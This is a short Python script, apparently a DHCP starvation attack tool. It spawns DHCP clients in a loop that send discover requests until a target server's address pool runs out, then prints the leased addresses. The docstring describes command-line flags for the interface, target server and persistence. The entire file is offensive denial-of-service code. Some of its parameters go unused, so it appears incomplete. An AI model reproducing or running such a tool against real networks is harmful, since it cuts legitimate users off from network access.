from  dhcpClient import DHCPClient
import time 
import sys


def starvation( interface : str  , serverIp: str )-> None : 
	'''
	usage: DHCPStarvationNEW.py [-h] [-p] [-i IFACE] [-t TARGET]
            DHCP Starvation
		optional arguments:
			-h, --help show this help message and exit 
			-p, --persist persistant?
			-i IFACE, --iface IFACE Interface you wish to use
              		-t TARGET, --target TARGET IP of target server
	'''
	threads =[ ]
	clients = [] 
	while(DHCPClient.aborted == -1 ):
		client = DHCPClient()
		threads.append(client.discover())
		clients.append(client)
	
	for thread in threads : 
		if thread : 
			thread.join()
	print(f"ended starvation aborted :  {DHCPClient.aborted } " ) 
	clients = list(filter(lambda client : client.ip != "0.0.0.0" , clients ) ) 
	clients.sort(key=lambda client  : client.ip ) 
	for client in clients : 
		print(f"client {client.name}\{client.time-time.time():.0f}\{client.ip}")


help = starvation.__doc__
flags = {("iface" , "i") : None , ("target","t")  : None , ("persist","p")  : None }
